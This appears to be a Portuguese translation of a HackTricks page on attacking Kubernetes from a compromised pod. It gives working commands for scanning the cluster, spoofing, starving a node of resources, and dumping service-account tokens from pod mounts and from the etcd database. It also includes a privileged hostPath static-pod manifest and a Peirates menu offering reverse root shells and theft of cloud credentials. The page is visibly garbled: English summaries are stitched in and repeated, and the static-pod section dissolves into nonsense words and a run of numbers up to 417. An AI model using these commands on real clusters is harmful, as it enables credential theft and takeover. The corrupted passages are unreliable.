# Atacando o Kubernetes de dentro de um Pod

{% hint style="success" %}
Aprenda e pratique Hacking na AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Treinamento Especialista em Equipe Vermelha AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Treinamento Especialista em Equipe Vermelha GCP (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## **Fuga do Pod**

**Se tiver sorte, pode conseguir escapar para o n√≥:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Escapando do pod

Para tentar escapar dos pods, voc√™ pode precisar **elevar privil√©gios** primeiro, algumas t√©cnicas para fazer isso:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Voc√™ pode verificar essas **fugas do Docker para tentar escapar** de um pod comprometido:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Abusando dos Privil√©gios do Kubernetes

Como explicado na se√ß√£o sobre **enumera√ß√£o do Kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Normalmente, os pods s√£o executados com um **token de conta de servi√ßo** dentro deles. Esta conta de servi√ßo pode ter alguns **privil√©gios anexados** que voc√™ poderia **abusar** para **mover-se** para outros pods ou at√© mesmo **escapar** para os n√≥s configurados dentro do cluster. Veja como em:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Abusando dos Privil√©gios na Nuvem

Se o pod √© executado dentro de um **ambiente de nuvem**, voc√™ pode ser capaz de **vazar um token do endpoint de metadados** e elevar privil√©gios usando-o.

## Pesquisar servi√ßos de rede vulner√°veis

Como voc√™ est√° dentro do ambiente do Kubernetes, se n√£o conseguir elevar privil√©gios abusando dos privil√©gios atuais dos pods e n√£o conseguir escapar do cont√™iner, voc√™ deve **procurar servi√ßos potencialmente vulner√°veis.**

### Servi√ßos

**Para este prop√≥sito, voc√™ pode tentar obter todos os servi√ßos do ambiente Kubernetes:**
```
kubectl get svc --all-namespaces
```
Por padr√£o, o Kubernetes usa um esquema de rede plana, o que significa que **qualquer pod/servi√ßo dentro do cluster pode se comunicar com outros**. Os **namespaces** dentro do cluster **n√£o possuem restri√ß√µes de seguran√ßa de rede por padr√£o**. Qualquer pessoa no namespace pode se comunicar com outros namespaces.

### Escaneamento

O seguinte script Bash (retirado de um [workshop do Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) ir√° instalar e escanear os intervalos de IP do cluster Kubernetes:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
D√™ uma olhada na seguinte p√°gina para aprender como voc√™ poderia **atacar servi√ßos espec√≠ficos do Kubernetes** para **comprometer outros pods/todo o ambiente**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### Sniffing

No caso do **pod comprometido estar executando algum servi√ßo sens√≠vel** onde outros pods precisam autenticar, voc√™ pode ser capaz de obter as credenciais enviadas pelos outros pods **farejando comunica√ß√µes locais**.

## Network Spoofing

Por padr√£o, t√©cnicas como **ARP spoofing** (e gra√ßas a isso **DNS Spoofing**) funcionam na rede do Kubernetes. Ent√£o, dentro de um pod, se voc√™ tiver a **capacidade NET\_RAW** (que est√° l√° por padr√£o), voc√™ poder√° enviar pacotes de rede personalizados e realizar **ataques de MitM via ARP Spoofing para todos os pods em execu√ß√£o no mesmo n√≥**.\
Al√©m disso, se o **pod malicioso** estiver em execu√ß√£o no **mesmo n√≥ que o Servidor DNS**, voc√™ poder√° realizar um **ataque de DNS Spoofing para todos os pods no cluster**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

N√£o h√° especifica√ß√£o de recursos nos manifestos do Kubernetes e **limites n√£o aplicados** para os cont√™ineres. Como atacante, podemos **consumir todos os recursos onde o pod/deployment est√° em execu√ß√£o** e privar outros recursos, causando um DoS para o ambiente.

Isso pode ser feito com uma ferramenta como [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Voc√™ pode ver a diferen√ßa enquanto executa `stress-ng` e depois
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## P√≥s-Explora√ß√£o do Node

Se voc√™ conseguiu **escapar do cont√™iner**, encontrar√° algumas coisas interessantes no node:

- O processo de **Container Runtime** (Docker)
- Mais **pods/cont√™ineres** em execu√ß√£o no node que voc√™ pode abusar como este (mais tokens)
- Todo o **sistema de arquivos** e o **SO** em geral
- O servi√ßo **Kube-Proxy** ouvindo
- O servi√ßo **Kubelet** ouvindo. Verifique os arquivos de configura√ß√£o:
  - Diret√≥rio: `/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- Outros **arquivos comuns do Kubernetes**:
  - `$HOME/.kube/config` - **Configura√ß√£o do Usu√°rio**
  - `/etc/kubernetes/kubelet.conf`- **Configura√ß√£o Regular**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **Configura√ß√£o de Inicializa√ß√£o**
  - `/etc/kubernetes/manifests/etcd.yaml` - **Configura√ß√£o do etcd**
  - `/etc/kubernetes/pki` - **Chave do Kubernetes**

### Encontrar o kubeconfig do node

Se voc√™ n√£o conseguir encontrar o arquivo kubeconfig em um dos caminhos comentados anteriormente, **verifique o argumento `--kubeconfig` do processo kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Roubar Segredos
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
O script [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) ir√° automaticamente **obter os tokens de outros pods e verificar se eles t√™m a permiss√£o** que voc√™ est√° procurando (em vez de voc√™ verificar um por um):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### DaemonSets Privilegiados

Um DaemonSet √© um **pod** que ser√° **executado** em **todos os n√≥s do cluster**. Portanto, se um DaemonSet for configurado com uma **conta de servi√ßo privilegiada**, em **TODOS os n√≥s** voc√™ ser√° capaz de encontrar o **token** dessa **conta de servi√ßo privilegiada** que voc√™ poderia abusar.

O exploit √© o mesmo da se√ß√£o anterior, mas agora voc√™ n√£o depende da sorte.

### Pivot para a Nuvem

Se o cluster for gerenciado por um servi√ßo de nuvem, geralmente o **N√≥ ter√° um acesso diferente ao endpoint de metadados** do que o Pod. Portanto, tente **acessar o endpoint de metadados a partir do n√≥** (ou de um pod com hostNetwork para True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Roubar etcd

Se voc√™ puder especificar o [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) do N√≥ que executar√° o cont√™iner, obtenha um shell dentro de um n√≥ de plano de controle e obtenha o **banco de dados etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Os n√≥s de control-plane t√™m a **fun√ß√£o de mestre** e em **clusters gerenciados na nuvem voc√™ n√£o poder√° executar nada neles**.

#### Ler segredos do etcd

Se voc√™ puder executar seu pod em um n√≥ de control-plane usando o seletor `nodeName` na especifica√ß√£o do pod, voc√™ pode ter acesso f√°cil ao banco de dados `etcd`, que cont√©m toda a configura√ß√£o do cluster, incluindo todos os segredos.

Abaixo est√° uma maneira r√°pida e suja de pegar segredos do `etcd` se ele estiver sendo executado no n√≥ de control-plane em que voc√™ est√°. Se voc√™ deseja uma solu√ß√£o mais elegante que inicie um pod com a utilidade do cliente `etcd` `etcdctl` e use as credenciais do n√≥ de control-plane para se conectar ao etcd onde quer que ele esteja sendo executado, confira [este exemplo de manifesto](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) de @mauilion.

**Verifique se o `etcd` est√° sendo executado no n√≥ de control-plane e veja onde o banco de dados est√° (Isso √© em um cluster criado com `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# Atacando o Kubernetes de Dentro de um Pod

Ao executar um pod comprometido em um cluster Kubernetes, um invasor pode explorar v√°rias t√©cnicas para escalar seus privil√©gios e comprometer outros recursos no cluster. Algumas t√©cnicas comuns incluem:

1. **Montagem de Volumes do Host**: Montar o diret√≥rio raiz do host dentro do pod pode permitir que um invasor acesse outros pods e segredos sens√≠veis.

2. **Execu√ß√£o de Comandos Privilegiados**: A execu√ß√£o de comandos com privil√©gios elevados dentro de um pod comprometido pode ajudar um invasor a obter controle total sobre o cluster.

3. **Explora√ß√£o de Vulnerabilidades**: Aproveitar vulnerabilidades conhecidas no Kubernetes ou em aplica√ß√µes em execu√ß√£o no cluster para obter acesso n√£o autorizado.

√â crucial implementar pr√°ticas de seguran√ßa s√≥lidas, como limitar as permiss√µes dos pods e monitorar de perto o tr√°fego de rede, para proteger o cluster Kubernetes contra ataques internos.
```bash
data-dir=/var/lib/etcd
```
**Visualizar os dados no banco de dados etcd:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Extrair os tokens do banco de dados e mostrar o nome da conta de servi√ßo**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**Mesmo comando, mas com alguns greps para retornar apenas o token padr√£o no namespace kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, either through a compromised container or by exploiting a vulnerability, they can perform various malicious activities within the cluster. This section explores some common techniques attackers use to escalate privileges and move laterally within a Kubernetes cluster from inside a pod.

### Privilege Escalation

#### Exploiting Misconfigured RBAC Roles

Attackers can abuse misconfigured Role-Based Access Control (RBAC) roles to escalate their privileges within the cluster. By modifying existing roles or creating new ones, attackers can gain more permissions than intended, allowing them to access sensitive resources and perform unauthorized actions.

#### Accessing the Kubernetes API Server

Once inside a pod, attackers can attempt to access the Kubernetes API server using tools like `kubectl` or by sending direct API requests. If successful, attackers can gather valuable information about the cluster's configuration, deploy new workloads, or even delete existing resources.

### Lateral Movement

#### Pod Hopping

Attackers can move laterally within the cluster by compromising multiple pods. By exploiting vulnerabilities or weak configurations in other pods, attackers can pivot from one pod to another, gradually expanding their control and influence over the cluster.

#### Service Account Compromise

If an attacker compromises a pod's service account token, they can abuse it to authenticate to the Kubernetes API server and perform actions on behalf of the compromised pod. This can lead to further privilege escalation and unauthorized access to cluster resources.

### Conclusion

Securing Kubernetes clusters requires implementing strong security measures to prevent attackers from moving laterally and escalating privileges within the cluster. Regular security assessments, proper RBAC configurations, and monitoring for unauthorized activities are essential to maintaining a secure Kubernetes environment.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Persist√™ncia de Pods Est√°ticos/Refletidos

_Pods Est√°ticos_ s√£o gerenciados diretamente pelo daemon kubelet em um n√≥ espec√≠fico, sem que o servidor de API os observe. Ao contr√°rio dos Pods gerenciados pelo plano de controle (por exemplo, um Deployment); em vez disso, o **kubelet observa cada Pod est√°tico** (e o reinicia se falhar).

Portanto, os Pods est√°ticos est√£o sempre **vinculados a um Kubelet** em um n√≥ espec√≠fico.

O **kubelet** tenta automaticamente criar um Pod espelho no servidor de API do Kubernetes para cada Pod est√° do. Isso significa que os Pods em execu√ß√£o em um n√≥ s√£o vis√≠veis no servidor de API, mas n√£o podem ser controlados a partir dele. Os nomes dos Pods ter√£o um sufixo com o nome do n√≥ com um h√≠fen inicial.

{% hint style="danger" %}
O **`spec` de um Pod est√°tico n√£o pode se referir a outros objetos de API** (por exemplo, ServiceAccount, ConfigMap, Secret, etc. Portanto, **voc√™ n√£o pode abusar desse comportamento para lan√ßar um pod com uma ServiceAccount arbitr√°ria** no n√≥ atual para comprometer o cluster. Mas voc√™ poderia usar isso para executar pods em namespaces diferentes (caso seja √∫til por algum motivo).
{% endhint %}

Se voc√™ estiver dentro do n√≥ host, pode fazer com que ele crie um **pod est√°tico dentro dele mesmo**. Isso √© bastante √∫til porque pode permitir que voc√™ **crie um pod em um namespace diferente**, como **kube-system**.

Para criar um pod est√°tico, a [Ãà [**documenta√ß√£o √© de grande ajuda**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Basicamente, voc√™ precisa de 2 coisas:

* Configurar o par√¢metro **`--pod-manifest-path=/etc/kubernetes/manifests`** no **servi√ßo kubelet**, ou no **config kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) e reiniciar o servi√ßo
* Criar a defini√ß√£o no **arquivo de def historians. is  of Real























 .



  of  of  of  of  of  of  of  of             of                          of           .

                                of    .

    3. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 50. 51. 52. 53. 54. 55. 56. 57. 58. 59. 60. 61. 62. 63. 64. 65. 66. 67. 68. 69. 70. 71. 72. 73. 74. 75. 76. 77. 78. 79. 80. 81. 82. 83. 84. 85. 86. 87. 88. 89. 90. 91. 92. 93. 94. 95. 96. 97. 98. 99. 100. 101. 102. 103. 104. 105. 106. 107. 108. 109. 110. 111. 112. 113. 114. 115. 116. 117. 118. 119. 120. 121. 122. 123. 124. 125. 126. 127. 128. 129. 130. 131. 132. 133. 134. 135. 136. 137. 138. 139. 140. 141. 142. 143. 144. 145. 146. 147. 148. 149. 150. 151. 152. 153. 154. 155. 156. 157. 158. 159. 160. 161. 162. 163. 164. 165. 166. 167. 168. 169. 170. 171. 172. 173. 174. 175. 176. 177. 178. 179. 180. 181. 182. 183. 184. 185. 186. 187. 188. 189. 190. 191. 192. 193. 194. 195. 196. 197. 198. 199. 200. 201. 202. 203. 204. 205. 206. 207. 208. 209. 210. 211. 212. 213. 214. 215. 216. 217. 218. 219. 220. 221. 222. 223. 224. 225. 226. 227. 228. 229. 230. 231. 232. 233. 234. 235. 236. 237. 238. 239. 240. 241. 242. 243. 244. 245. 246. 247. 248. 249. 250. 251. 252. 253. 254. 255. 256. 257. 258. 259. 260. 261. 262. 263. 264. 265. 266. 267. 268. 269. 270. 271. 272. 273. 274. 275. 276. 277. 278. 279. 280. 281. 282. 283. 284. 285. 286. 287. 288 hi 289. 290. 291. 292. 293. 294. 295. 296. 297. 298. 299. 300. 301. 302. 303. 304. 305. 306. 307. 308. 309. 310. 311. 312. 313. 314. 315. 316. 317. 318. 319. 320. 321. 322. 323. 324. 325. 326. 327. 328. 329. 330. 331. 332. 333. 334. 335. 336. 337. 338. 339. 340. 341. 342. 343. 344. 345. 346. 347. 348. 349. 350. 351. 352. 353. 354. 355. 356. 357. 358. 359. 360. 361. 362. 363. 364. 365. 366. 367. 368. 369. 370. 371. 372. 373. 374. 375. 376. 377. 378. 379. 380. 381. 382. 383. 384. 385. 386. 387. 388. 389. 390. 391. 392. 393. 394. 395. 396. 397. 398. 399. 400. 401. 402. 403. 404. 405. 406. 407. 408. 409. 410. 411. 412. 413. 414. 415. 416. 417
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Excluir pods + n√≥s n√£o escalon√°veis

Se um atacante **comprometeu um n√≥** e ele pode **excluir pods** de outros n√≥s e **impedir que outros n√≥s executem pods**, os pods ser√£o reiniciados no n√≥ comprometido e ele poder√° **roubar os tokens** executados neles.\
Para [**mais informa√ß√µes siga estes links**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Ferramentas Autom√°ticas

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
